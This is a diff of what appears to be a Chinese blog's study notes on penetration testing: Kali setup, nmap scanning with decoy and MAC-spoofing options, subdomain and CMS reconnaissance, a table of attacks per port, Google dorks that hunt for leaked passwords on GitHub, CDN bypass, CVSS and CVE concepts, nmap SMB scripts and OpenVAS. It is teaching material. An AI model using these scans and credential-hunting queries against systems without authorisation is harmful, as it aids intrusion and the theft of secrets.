+<li><img src="https://kite-007.github.io/post-images/1617272711283.png" alt="" loading="lazy"></li>
 </ul>
-<h2 id="2-换源并更新">2. 换源并更新</h2>
+<hr>
 <ul>
-<li>kali的源文件在/etc/apt/sources.list文件中。</li>
+<li>searchsploit 工具，kali下自带的一个漏洞查询工具</li>
+<li><img src="https://kite-007.github.io/post-images/1617273103152.png" alt="" loading="lazy">
+<ul>
+<li>这些内容是存放在操作系统的某个目录下的，目录下会按照平台，脚本以及类型进行划分。</li>
+<li>cd /usr/share/exploitdb/exploits目录下面有分类，这是可以按照搜索下面的Path目录进行访问查看。</li>
+<li>vim ./multiple/remote/21490.txt</li>
+<li><img src="https://kite-007.github.io/post-images/1617273524071.png" alt="" loading="lazy"></li>
 </ul>
-<pre><code>sudo vim /etc/apt/sources.list（打开sources.list 文件）
-
-官方源
-deb http://http.kali.org/kali kali-rolling main non-free contrib
-deb-src http://http.kali.org/kali kali-rolling main non-free contrib
-中科大源
-deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
-deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
-阿里云源
-deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
-deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
-清华大学源
-deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
-deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
-浙大源
-deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free
-deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free
-
-sudo apt-get update  # 取回更新的软件包列表信息
-sudo apt-get upgrade # 进行一次升级
-sudo apt-get clean # 删除已经下载的安装包
-sudo reboot  #重启
-
-安装vm-tools（因为实验很久并没有成功使用“文件夹共享功能”所以选择了这个方法）
-可以快速方便的将文件直接拖进kali中使用
-
-打开“终端”
-输入sudo apt update (获取更新目录）
-输入sudo apt -y full-upgrade (更新软件，-y参数表示自动）
-输入sudo apt -y install open-vm-tools-desktop fuse （安装虚拟机增强工具）
-输入sudo reboot (重启）
+</li>
+</ul>
+<h2 id="2-从信息的维度定义漏洞管理">2. 从信息的维度定义漏洞管理</h2>
+<ol>
+<li>企业：</li>
+</ol>
+<ul>
+<li>优先从漏洞的危险等级，从高到低进行处理，逐渐改进，不断完善。</li>
+<li>信息收集
+<ul>
+<li>漏洞扫描器扫描发现网络IP，OS，服务，配置，漏洞</li>
+<li>能力需求：定义扫描方式内容和目标。</li>
+</ul>
+</li>
+<li>信息管理*
+<ul>
+<li>格式化信息，并进行筛选，分组，定义优先级</li>
+<li>能力需求：资产分组，指定所有者，向所有者报告漏洞</li>
+</ul>
+</li>
+<li>信息输出
+<ul>
+<li>向不同层次的人群展示足够的信息量，生成不同的报告</li>
+<li>能力需求：生成报告，导出数据，SIEM集成进行统一管理</li>
+</ul>
+</li>
+</ul>
+<h2 id="3-弱点扫描类型">3. 弱点扫描类型</h2>
+<ul>
+<li>主动扫描
+<ul>
+<li>有身份验证</li>
+<li>无身份验证</li>
+</ul>
+</li>
+<li>被动扫描
+<ul>
+<li>镜像端口抓包</li>
+<li>其他来源输入</li>
+</ul>
+</li>
+</ul>
+<pre><code>主动扫描和被动扫描都是无法进行登录目标系统，以一种接近黑盒的形式对目标系统进行探测，根据
+反馈去猜测目标系统是否存在漏洞。主动扫描也可以有目标系统的登录权，可以有扫描器登入到系统
+对目标进行扫描，通常情况使用不多。
 </code></pre>
-<h2 id="3-安装输入法">3. 安装输入法</h2>
-<ol>
-<li>安装输入法框架（apt install fcitx）</li>
-<li>安装谷歌拼音（apt install fcitx-googlepinyin）</li>
-</ol>
-<h1 id="2-信息收集">2. 信息收集</h1>
-<h2 id="1-nmap扫描ip">1. Nmap扫描（IP）</h2>
-<ol>
-<li>使用流程：(目标确认—》主机发现—》扫描端口—》扫描技术—》探测服务—》探测防火墙—》性能优化—》报告输出)</li>
-<li>用途： 活跃IP，端口的扫描，对端口，服务，操作系统的探测，将扫描的内容保存在一个文件，扫描常用的端口，多种扫描方式，脚本扫描，性能控制，主机发现，规避防火墙，MAC欺骗，空闲扫描。</li>
-<li>端口扫描：</li>
-</ol>
 <ul>
-<li>nmap 【网站/IP地址】-p 【端口】 -sS(扫描方式:基于TCP SYN) -sV(探测服务信息) -O(探测操作系统) -A(包含了-sV和-O等)
+<li>基于Agent的扫描
 <ul>
-<li>可以按回车显示进度，如果不对单一的端口进行扫描直接使用-sS -A即可。-iR，对随机IP扫描。</li>
-<li>活跃IP：是指 一个 ip段 ，存在的 主机 较多， 查找 活跃 ip的 人一般会，运行远程溢出，弱口令扫描软件。</li>
-<li>-p --top-ports X：扫描常用的端口X个。</li>
-<li>-oN 【目录】，输出扫描内容到该目录的文件夹</li>
-<li>--script=【./脚本目录】可以使用脚本</li>
-<li>-n；不做DNS解析，如果解析了会知道域名</li>
-<li>-F；扫描默认常用端口100多</li>
-<li>-sL；简单列出扫描目标信息</li>
-<li>-Pn；nmap扫描过程中会探测主机是否在线，如果主机在线，则会去扫描端口，通常情况下已经知道了主机在线，所以加上-Pn 【IP】，则不用再去探测主机是否在线，默认主机为在线状态。</li>
-<li>-O：检测操作系统</li>
-<li>-D 【IP】，【IP】：设置诱饵隐蔽扫描</li>
-<li>-g 【端口】 【IP】：设置自己来源端口与IP（假）</li>
-<li>-T&lt;0-5&gt;：速度性能控制</li>
-<li>--spoof -mac 【MAC地址】：伪造自己的访问目标MAC地址为对应MAC地址</li>
-<li>-sI ip:【脚本扫描到的端口】 【脚本扫描到的IP】；网络上有多台主机，当有某台空闲的时候，就可以利用对方的IP做出一些扫描。</li>
-<li>sudo nmap --script ipidseq iR 10000 -oN ipidseq.txt
-<ul>
-<li>用脚本扫描扫出可以使用空闲扫描的对应IP端口</li>
+<li>支持平台有限</li>
 </ul>
 </li>
 </ul>
-</li>
-</ul>
-<h2 id="2-子域名">2. 子域名</h2>
-<p><em>补充：子域名也要做DNS解析，它也有对应的IP。</em></p>
-<ul>
-<li>子域名有很多的获取方式。</li>
-</ul>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[1. 信息收集之基本介绍]]></title>
-        <id>https://kite-007.github.io/1-xin-xi-shou-ji/</id>
-        <link href="https://kite-007.github.io/1-xin-xi-shou-ji/">
-        </link>
-        <updated>2021-03-14T02:22:19.000Z</updated>
-        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
-<li><a href="#1%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">1.域名信息收集</a>
-<ul>
-<li><a href="#1-%E5%9F%9F%E5%90%8D%E4%BB%8B%E7%BB%8D">1. 域名介绍</a></li>
-<li><a href="#2-whois%E4%BB%8B%E7%BB%8D">2. Whois介绍</a></li>
-<li><a href="#3-whois%E6%9F%A5%E8%AF%A2">3. Whois查询</a></li>
-<li><a href="#4-%E5%A4%87%E6%A1%88%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2">4. 备案信息查询</a></li>
-</ul>
-</li>
-<li><a href="#2-%E5%AD%90%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">2. 子域名信息收集</a>
-<ul>
-<li><a href="#1-%E5%AD%90%E5%9F%9F%E5%90%8D%E4%BB%8B%E7%BB%8D">1. 子域名介绍</a></li>
-<li><a href="#2-%E6%8C%96%E6%8E%98%E5%AD%90%E5%9F%9F%E5%90%8D%E9%87%8D%E8%A6%81%E6%80%A7">2. 挖掘子域名重要性</a></li>
-<li><a href="#3-%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95">3. 子域名挖掘方法</a></li>
-<li><a href="#4-%E5%88%B7%E6%B4%9E%E6%80%9D%E8%B7%AF">4. 刷洞思路</a></li>
-</ul>
-</li>
-<li><a href="#3-web%E7%AB%99%E7%82%B9%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">3. web站点信息收集</a>
-<ul>
-<li><a href="#1-cms%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB">1. CMS指纹识别</a></li>
-<li><a href="#2-%E9%92%88%E5%AF%B9cms%E6%BC%8F%E6%B4%9E%E6%9F%A5%E8%AF%A2">2. 针对CMS漏洞查询</a></li>
-<li><a href="#3-%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF">3. 敏感目录信息</a></li>
-<li><a href="#4-wordpress%E6%B5%8B%E8%AF%95wpscankali">4. wordpress测试（wpscan）(kali)</a></li>
-</ul>
-</li>
-<li><a href="#4-%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">4. 端口信息收集</a>
-<ul>
-<li><a href="#1-%E7%AB%AF%E5%8F%A3%E4%BB%8B%E7%BB%8D">1. 端口介绍</a></li>
-<li><a href="#2-%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">2. 端口信息收集</a></li>
-<li><a href="#3-%E7%AB%AF%E5%8F%A3%E6%94%BB%E5%87%BB%E4%B9%8C%E4%BA%91%E6%9F%A5%E8%AF%A2%E7%AD%89%E7%AD%89">3. 端口攻击（乌云查询等等）</a></li>
-<li><a href="#4-%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD">4. 防御措施</a></li>
-</ul>
-</li>
-<li><a href="#5-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">5. 敏感信息收集</a>
-<ul>
-<li><a href="#1-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%87%8D%E8%A6%81%E6%80%A7">1. 敏感信息收集重要性</a></li>
-<li><a href="#2-google-hacking%E8%AF%AD%E6%B3%95">2. Google Hacking语法</a></li>
-<li><a href="#3-http%E5%93%8D%E5%BA%94%E6%94%B6%E9%9B%86server%E4%BF%A1%E6%81%AF">3. HTTP响应收集Server信息</a></li>
-<li><a href="#4-github%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">4. Github信息泄露</a></li>
-</ul>
-</li>
-<li><a href="#6-%E7%9C%9F%E5%AE%9Eip%E5%9C%B0%E5%9D%80%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">6. 真实IP地址信息收集</a>
-<ul>
-<li><a href="#1-cdn%E4%BB%8B%E7%BB%8D">1. CDN介绍</a></li>
-<li><a href="#2-%E5%88%A4%E6%96%ADcdn%E5%AD%98%E5%9C%A8">2. 判断CDN存在</a></li>
-<li><a href="#3-%E7%BB%95%E8%BF%87cdn">3. 绕过CDN</a></li>
-<li><a href="#4-%E9%AA%8C%E8%AF%81ip%E5%9C%B0%E5%9D%80">4. 验证IP地址</a></li>
-</ul>
-</li>
-<li><a href="#7-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">7. 信息收集</a>
-<ul>
-<li><a href="#1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">1. 信息收集</a></li>
-<li><a href="#2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%96%B9%E5%BC%8F">2. 信息收集方式</a></li>
-</ul>
-</li>
-<li><a href="#8-shodan">8. Shodan</a>
-<ul>
-<li><a href="#1-shodan%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8">1. Shodan基本使用</a></li>
-<li><a href="#2-shodan%E5%91%BD%E4%BB%A4%E8%A1%8C">2. Shodan命令行</a></li>
-</ul>
-</li>
-</ul>
-(信息收集)</p>
-<h1 id="1域名信息收集">1.域名信息收集</h1>
-<h2 id="1-域名介绍">1. 域名介绍</h2>
-<ol>
-<li>域名（Domain Name），是由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位。在开始时，没有域名，要访问只能通过IP地址访问。
-<ul>
-<li>eg：百度：baidu.com，www为主机名</li>
-<li>浏览网站的过程：（PC发送对应请求从DNS服务器获得的指定域名对应的IP地址，后通过IP地址访问网站）</li>
-</ul>
-</li>
-</ol>
-<h2 id="2-whois介绍">2. Whois介绍</h2>
-<ol>
-<li>Whois，是用来查询域名的IP以及所有者等信息的传输协议，就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库。不同的域名后缀的Whois信息需要用到不同的Whois数据库查询，每个域名或IP的Whois信息由对应的管理机构保存。</li>
-<li>Whois，他的基本过程：先向服务器的TCP端口43建立一个连接，发送要查询的数据给Whois服务器，后接收服务器的查询结果。</li>
-</ol>
-<h2 id="3-whois查询">3. Whois查询</h2>
-<ol>
-<li>Whois查询的重要性：通过Whois查询可以获得域名注册者邮箱地址等信息。一般情况下对于中小型网站来说域名注册者就是网站管理员。利用搜索引擎对Whois查询到的信息进行搜索，获取更多域名注册者的个人信息。</li>
-<li>Whois查询方法：<br>
-1、Web接口查询：</li>
-</ol>
-<ul>
-<li>https://whois.aliyun.com/、</li>
-<li>https://www.whois365.com/cn/</li>
-<li>http://whois.chinaz.com/、</li>
-<li>https://whois.aizhan.com/<br>
-2、通过Whois命令行查询。</li>
-<li>在Kali linux下自带了Whois查询工具，通过命令whois域名 进行查询。</li>
-<li>whois [域名]</li>
-</ul>
-<h2 id="4-备案信息查询">4. 备案信息查询</h2>
-<ol>
-<li>ICP备案介绍：（Internet Content Provider）网络内容提供商。<br>
-《互联网信息服务管理办法》指出互联网信息服务分为经营性和非经营性两类。国家对经营性互联网信息服务实行许可制度；对非经营性互联网信息服务实行备案制度。未取得许可或者未履行备案手续的，不得从事互联网信息服务。在中华人民共和国境内提供非经营性互联网信息服务，应当依法履行备案手续。未经国家机关单位许可备案，不得在中华人民共和国境内从事非经营性互联网信息服务。</li>
-<li>备案好处：为了防止在网上从事非法的网站经营活动，打击不良互联网信息的传播，如果网站不备案的话，很有可能被查处以后关停。</li>
-<li>ICP备案查询方法：</li>
-</ol>
-<ul>
-<li>Web接口查询：
-<ul>
-<li>http://www.beianbeian.com/</li>
-<li>http://www.miitbeian.gov.cn/publish/query/indexFirst.action</li>
-<li>https://www.tianyancha.com/</li>
-</ul>
-</li>
-</ul>
-<h1 id="2-子域名信息收集">2. 子域名信息收集</h1>
-<h2 id="1-子域名介绍">1. 子域名介绍</h2>
-<ol>
-<li>顶级域名：是“.com&quot;、&quot;.net&quot;、&quot;.org”、&quot;.cn&quot;等等。</li>
-<li>子域名(Subdomain Name)，凡顶级域名前加前缀的都是该顶级域名的子域名，而子域名根据技术的多少分为二级子域名，三级子域名以及多级子域名。我国在国际互联网络信息中心正式注册并运行的顶级域名是.cn，这也是我国的一级域名。</li>
-<li>在顶级域名之下，我国的二级域名又分为类别域名和行政区域名两类。类别域名共6个， 包括用于科研机构的.ac；用于工商金融企业的.com；用于教育机构的.edu；用于政府部门的.gov；用于互联网络信息中心和运行中心的.net；用于非盈利组织的.org。而行政区域名有34个，分别对应于我国各省、自治区和直辖市。</li>
-<li>例如：www.snnu.edu.cn</li>
-</ol>
-<h2 id="2-挖掘子域名重要性">2. 挖掘子域名重要性</h2>
-<ol>
-<li>子域名是某个主域的二级域名或者多级域名，在防御措施严密情况下无法直接拿下主域，那么就可以采用迂回战术拿下子域名，然后无限靠近主域。</li>
-<li>例如：</li>
-</ol>
-<ul>
-<li>www.xxxxx.com主域不存在漏洞，并且防护措施严密。</li>
-<li>而二级域名 edu.xxxxx.com存在漏洞，并且防护措施松散。</li>
-</ul>
-<h2 id="3-子域名挖掘方法">3. 子域名挖掘方法</h2>
-<ol>
-<li>子域名挖掘工具 如：Maltego CE，wydomain，subDomainBrute，dnsmaper，Layer子域名挖掘机等等。</li>
-<li>实例演示：</li>
-</ol>
-<h2 id="4-刷洞思路">4. 刷洞思路</h2>
-<ol>
-<li>针对某个具体SRC进行挖洞，如果直接针对主域进行渗透测试很可能是很难达到挖掘的效果。此时可以<br>
-搜集对应的子域名，然后批量探测某些具体漏洞，从而更加快速容易的发现一些漏洞。之后将漏洞提交对应SRC获取奖金。</li>
-<li>针对补天刷洞思路：对应没有指定厂商的刷洞，可以根据某些具体漏洞，通过URL采集获取目标，编写探测脚本批量探测，快速高效的刷洞。</li>
-<li>注意：无论如何，都要保持警惕，不要触及不该触及的内容，不要影响公司业务，只做漏洞探测内容，确定存在漏洞即可。适可而止。</li>
-<li>挖洞高峰期：在互联网上曝出某些新漏洞的时候，会有大量的该漏洞提交到漏洞平台获取奖金。</li>
-</ol>
-<h1 id="3-web站点信息收集">3. web站点信息收集</h1>
-<h2 id="1-cms指纹识别">1. CMS指纹识别</h2>
-<ol>
-<li>CMS为内容管理系统，又称为整站系统或文章系统，通常用于网站内容管理。用户可以通过下载对应的CMS管理器软件包，通过部署搭建，可以很快地建立起一个内容管理系统，方便快捷。但是通常各种CMS都具有独特的结构命名规则和特定的软件文件内容，因此可以利用这些特定的内容来获取CMS站点的具体软件CMS与版本。</li>
-<li>常见CMS：dedecms（织梦），Discus（用于论坛），Phpcms等。</li>
-<li>CMS识别工具：</li>
-</ol>
-<ul>
-<li>在线工具：</li>
-<li>（http://whatweb.bugscaner.com/look/，http://www.yunsee.cn/finger.html）</li>
-<li>本地工具：</li>
-<li>whatweb，</li>
-<li>御剑web指纹识别程序（https://pan.baidu.com/share/link?shareid=437376&amp;uk=3526832374）</li>
-<li>大禹CMS识别程序（https://github.com/Ms0x0/Dayu）</li>
-</ul>
-<h2 id="2-针对cms漏洞查询">2. 针对CMS漏洞查询</h2>
-<ul>
-<li>对于查询到的CMS可以用https://bugs.shuimugan.com（失效）网站查询指定CMS的漏洞。</li>
-</ul>
-<h2 id="3-敏感目录信息">3. 敏感目录信息</h2>
-<ol>
-<li>针对目标Web目录结构和敏感隐藏文件探测是非常重要的。在探测过程中很用可能会探测出后台页面，上传页面，数据库文件，甚至是网站源代码文件压缩包等等。</li>
-<li>探测工具：</li>
-</ol>
-<ul>
-<li>御剑后台扫描工具</li>
-<li>wwwscan命令行工具</li>
-<li>dirb命令行工具（kali）</li>
-<li>dirbuster扫描工具（kali）</li>
-</ul>
-<h2 id="4-wordpress测试wpscankali">4. wordpress测试（wpscan）(kali)</h2>
-<h1 id="4-端口信息收集">4. 端口信息收集</h1>
-<h2 id="1-端口介绍">1. 端口介绍</h2>
-<ol>
-<li>如果将IP比作一个房子，端口就是进出这个房子的门。一个IP可以有65536个端口（2^16）。端口是通过端口号来标记的，端口号只有整数，范围是从0到65535。</li>
-<li>在计算机中一个端口代表一个服务，windows命令行可以使用netstat -anbo显示开放端口。</li>
-</ol>
-<h2 id="2-端口信息收集">2. 端口信息收集</h2>
-<ol>
-<li>对于收集的目标机器的端口状态可以使用工具来进行测试。原理：使用TCP或者UDP等协议向目标端口发送指定标志位等的数据包，接受目标返回的数据包，通过这些返回的数据包来进行判断端口的状态。</li>
-<li>工具：</li>
-</ol>
-<ul>
-<li>使用nmap(kali)探测。nmap -A -v -T4 [目标]</li>
-<li>也可以使用masscan(kali)。</li>
-<li>在线网站：http://tool.chinaz.com/port/</li>
-</ul>
-<h2 id="3-端口攻击乌云查询等等">3. 端口攻击（乌云查询等等）</h2>
-<ol>
-<li>不同的端口有不同的攻击方法。</li>
-</ol>
-<ul>
-<li>针对远程连接服务端口。</li>
-<li>端口 | 端口说明 | 攻击方法</li>
-<li>22 | SSH远程连接  | 爆破、SSH隧道及内网代理转发、文件传输</li>
-<li>23 | Telnet远程连接 | 爆破、嗅探、弱口令</li>
-<li>3389 | rdp远程桌面 | Shift后门、爆破</li>
-<li>5900  | VNC远程连接 | 弱口令、RCE</li>
-<li>5632 | PcAnywhere远程连接 | 嗅探、代码执行</li>
-</ul>
-<h2 id="4-防御措施">4. 防御措施</h2>
-<ol>
-<li>对于端口攻击来说只要端口开放并且可以连通，那么就可以利用对应的方式进行攻击测试。</li>
-<li>防御措施：</li>
-</ol>
-<ul>
-<li>关闭不必要的端口；</li>
-<li>对重要业务的服务端口设置防火墙：</li>
-<li>加强员工信息安全意识，经常性更换用户密码；</li>
-<li>经常更新软件，打补丁(patch)。</li>
-</ul>
-<h1 id="5-敏感信息收集">5. 敏感信息收集</h1>
-<h2 id="1-敏感信息收集重要性">1. 敏感信息收集重要性</h2>
-<ol>
-<li>针对某些安全做的很好的目标，直接通过技术层面是无法完成渗透测试。在这种情况下，可以利用搜索<br>
-引擎搜索目标暴露在互联网上的关联信息。例如：数据库文件、SQL注入、服务器配置信息、甚至是通<br>
-过Git找到站点泄露源代码、以及Redis等未授权访问、robots.txt等敏感信息。从而达到渗透测试的目的。</li>
-<li>知己知彼，百战不殆。某些情况下，收集到的信息会对后期进行测试起到帮助重要。如果通过收集敏感<br>
-信息直接获得了目标系统的数据库访问权限，那么渗透测试任务也就结束一大半了。因此在进行技术层<br>
-面情况下的测试之前，应该先进行更多的信息收集。</li>
-</ol>
-<h2 id="2-google-hacking语法">2. Google Hacking语法</h2>
-<ol>
-<li>google hack是指使用Google等搜索引擎对某些特定的网络主机漏洞(通常是服务器上的脚本漏洞)进行搜索，以达到快速找到漏洞主机或特定主机的漏洞的目的。</li>
-<li>关键字 | 含义</li>
-</ol>
-<ul>
-<li>site | 指定搜索域名 例如：site:baidu.com</li>
-<li>inurl | 指定URL中是否存在某些关键字 例如：inurl:.php?id=</li>
-<li>intext | 指定网页中是否存在某些关键字 例如：intext：网站管理</li>
-<li>filetype | 指定搜索文件类型 例如：filetype:txt</li>
-<li>intitle | 指定网页标题是否存在某些关键字 例如：intitle：后台管理</li>
-<li>link | 指定网页链接 例如：link：baidu.com 指定与百度做了外链的站点</li>
-<li>info | 指定搜索网页信息 info：baidu.com</li>
-</ul>
-<ol start="3">
-<li>Google hacking数据库：https://www.exploit-db.com/google-hacking-database/</li>
-<li>例如：查询Access数据：filetype:mdb &quot;standard jet&quot;(password | username | user  pass)</li>
-</ol>
-<h2 id="3-http响应收集server信息">3. HTTP响应收集Server信息</h2>
-<ol>
-<li>通过HTTP或HTTPS与目标站点进行通信中，目标响应的报文中Server头和X-Powered-By头会暴露目标服务器和使用的编程语言信息，通过这些信息可以有针对的利用漏洞尝试。</li>
-<li>获取HTTP响应的方法：</li>
-</ol>
-<ul>
-<li>利用工具如：浏览器审计工具、Burpsuite等代理截断工具。</li>
-<li>编写Python脚本requests库 参考链接：http://www.python-requests.org/en/master/</li>
-</ul>
-<pre><code>import requests
-r = requests.get('目标')
-print(r.headers)
+<pre><code>企业中对漏洞管理会使用的一种场景，需要在所有的服务器上面所有的设备上面，安装扫描器的a，
+a工作在目标系统里面，之后会在目标系统里面进行查询，探测，软件补丁版本判断。这样，通常
+下扫描的判断比较准确，效率比较高，但是比较受平台的限制，比如一些设备不可以去安装agent，
+交换机，应用场景局限。
 </code></pre>
-<h2 id="4-github信息泄露">4. Github信息泄露</h2>
+<h2 id="4-漏洞基本概念">4. 漏洞基本概念</h2>
 <ol>
-<li>Github是一个分布式的版本控制系统，目前拥有140多万开发者用户。随着越来越多的应用程序转移到了云上，Github已经成为了管理软件开发以及发现已有代码的首选方法。众所周知，当今是大数据时代，大规模数据泄露事情一直在发生，从未停止过，但有些人不知道的是很多时候一些敏感信息的泄露其实是我们自己无意中造成的，然而一个小疏忽，往往却造成一系列连锁反应。Github上敏感信息的泄露，就是一个典型的例子，Github虽然方便开发者，但其中也埋藏着一些安全隐患。</li>
-</ol>
+<li>
+<p>CVSS（Common Vulnerability Scoring System）</p>
 <ul>
-<li>Github之邮件配置信息泄露：site:Github.com smtp、site:Github.com smtp @qq.com</li>
-<li>Github之数据库信息泄露：site:Github.com sa password、site:Github.com root password、site:Github.com User ID=’sa’;Password</li>
-<li>Github之svn信息泄露：site:Github.com svn、site:Github.com svn username</li>
-<li>Github之综合信息泄露：site:Github.com password、site:Github.com ftp ftppassword、<br>
-site:Github.com 密码、site:Github.com 内部</li>
-</ul>
-<h1 id="6-真实ip地址信息收集">6. 真实IP地址信息收集</h1>
-<h2 id="1-cdn介绍">1. CDN介绍</h2>
-<ol>
-<li>CDN全称（Content Delivery Network），即内容分发网络。</li>
-<li>一些大型网站会拥有很多用户，而用户时常会向网站发送一些请求，不同地域有不同的缓冲服务器，用来接收用户发送的流量，如果用户发送的流量没有任何的交互数据，只是请求一个页面的话，这时用户可以根据所在地区来确定访问的缓冲服务器，那么这个高速缓冲服务器就会返回对应的响应到用户的浏览器中。</li>
-<li>只有交互时才能请求真实服务器。</li>
-</ol>
-<h2 id="2-判断cdn存在">2. 判断CDN存在</h2>
-<ol>
-<li>CDN一般存在于大型网站（用户流量特别多），通过CDN可以解决服务器性能的瓶颈。</li>
-<li>通过ping判断是否存在CDN（ping www.baihe.com）存在CDN。</li>
-<li>通过设置代理或者利用在线ping网站来使用不同地区的ping服务器来测试目标。（http://ping.chinaz.com）</li>
-</ol>
-<h2 id="3-绕过cdn">3. 绕过CDN</h2>
-<ol>
-<li>如果目标没有使用CDN，可以直接利用ping获得IP地址。或者利用在线网站（http://www.ip138.com）</li>
-<li>如果目标使用CDN，需要绕过CDN来获取真实IP地址。<br>
-1、内部邮箱源 收集到内部邮箱服务器IP地址<br>
-2、网站phpinfo文件phpinfo.php<br>
-3、分站IP地址，查询子域名 CDN很贵，很有可能分站就不再使用CDN。<br>
-4、国外访问 https://asm.ca.com/en/ping.php<br>
-5、查询域名解析记录 https://viewdns.info/</li>
-</ol>
-<h2 id="4-验证ip地址">4. 验证IP地址</h2>
-<p>利用IP地址对Web站点进行访问，如果正常表明是真实IP地址，否则不真。可能因为浏览器的原因访问的是空白的页面，有时会出来图标标明是真实的IP地址。</p>
-<h1 id="7-信息收集">7. 信息收集</h1>
-<h2 id="1-信息收集">1. 信息收集</h2>
-<ol>
-<li>信息收集在渗透测试中是重中之重，对于目标的信息收集，主要针对目标服务器系统，数据库系统，中间件系统，应用程序系统，以及边界设备等信息，以及收集针对于系统管理员的信息收集。</li>
-</ol>
-<h2 id="2-信息收集方式">2. 信息收集方式</h2>
-<ol>
-<li>主动信息收集：直接与目标进行交互，通过对交互过程中的信息进行收集。</li>
-</ol>
+<li>通用漏洞评分系统——工业标准，CVSS是安全内容自动化协议（SCAP）的一部分，通常CVSS与CVE一同由美国国家漏洞库（NVD）发布并保持数据的更新。
 <ul>
-<li>Nmap扫描，Burpsuite站点地图收集等。</li>
+<li>描述安全漏洞严重程度的统一评分方案，作用是给各个漏洞进行评分，按照漏洞的严重级别，给漏洞进行打分，最低0分，最高10分。</li>
 </ul>
+</li>
+<li>不同机构按CVSS分值定义威胁的安全程度，低，中，高。</li>
+<li>CVSS分值是工业标准，但威胁级别不是。</li>
+<li>路由度量值
+<ul>
+<li>Basic Metric：基础的恒定不变的弱点权重</li>
+<li>Temporal Metric：依赖时间因素的弱点权重</li>
+<li>Envriomental Metric：利用弱点的环境要求和实施难度的权重</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>CVE（Common Vulnerabilities and Exposures）</p>
+<ul>
+<li>每发现一个漏洞，管理组织就会给一个编号：CVE-2008-4250
+<ul>
+<li>是已公开的信息安全漏洞字典，统一的漏洞编号标准</li>
+<li>所有的扫描器都会遵守CVE的编号</li>
+<li>发布流程：发现漏洞，CAN指定CVE ID，发布到CVE List，MITRE公司负责对内容进行编辑维护。</li>
+</ul>
+</li>
+<li>很多厂商会维护自己的漏洞编号。
+<ul>
+<li>MS（微软）</li>
+<li>MSKB（微软补丁）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>SCAP</p>
+</li>
+</ol>
+<h1 id="2-nmap常用扫描脚本">2. NMAP常用扫描脚本</h1>
+<pre><code class="language-shell"># NMAP里包含所有脚本名称的一个文件，总共600+个
+cd /usr/share/nmap/scripts
+cat script.db
+
+# safe，安全类脚本，不会对目标产生破坏
+# discovery，用于发现的脚本
+# vuln，用于检测漏洞的脚本
+# exploit，漏洞利用
+</code></pre>
+<p><br><br></p>
+<ul>
+<li>smb-vuln-ms10-061.nse
+<ul>
+<li>Stuxnet蠕虫利用的4个漏洞之一，Stuxnet是美国对伊朗核设施进行攻击的震网病毒，美国军方所研发专门用来攻击伊朗核设施的一个病毒。</li>
+<li>smb-vuln-ms10-061.nse通过LANMAN API枚举对方系统的共享打印机，如果发现对方的打印机的话，一些低版本的系统(win XP，Server 2003 SP2，Vista，Server 2008，win 7)的Print Spooler权限默认是不当的，通过请求Print Spooler就可以在目标系统的操作目录下去执行恶意代码，去控制目标操作系统。<br>
+<br><br></li>
+</ul>
+</li>
+<li>smb-enum-shares.nse
+<ul>
+<li>如果目标系统没有开放LANMAN API就可以用smb-enum-shares.nse枚举共享去发现对方的打印机。 但是需要提供管理员账号，smbuser，smbpassword。</li>
+</ul>
+</li>
+</ul>
+<pre><code class="language-shell">nmap -p445 --script=smb-enum-shares.nse --script-args=smbuser=admin,smbpassword=pass 1.1.1.1
+
+eg：
+1. # 扫描查看此网段下的主机
+    nmap 192.168.200.0/24 -sn
+</code></pre>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617281958281.png" alt="" loading="lazy"></li>
+</ul>
+<pre><code class="language-shell">2. # 对此网段下的主机进行测试查看，看有没有开放端口
+nmap -p445 --script=smb-enum-shares.nse 192.168.200.*
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://kite-007.github.io/post-images/1617282092379.png" alt="" loading="lazy"></figure>
+<h1 id="3-弱点扫描器">3. 弱点扫描器</h1>
+<h2 id="1-openvas">1. OPENVAS</h2>
+<ul>
+<li>是开源的扫描器，最早是Nessus的一个项目分支，Nessus是目前世界上使用最广的一个商业的弱点扫描器。有开源版本，kali默认安装，但未配置和启用。</li>
+</ul>
+<ol>
+<li>配置OPENVAS(早期)
+<ol>
+<li>安装</li>
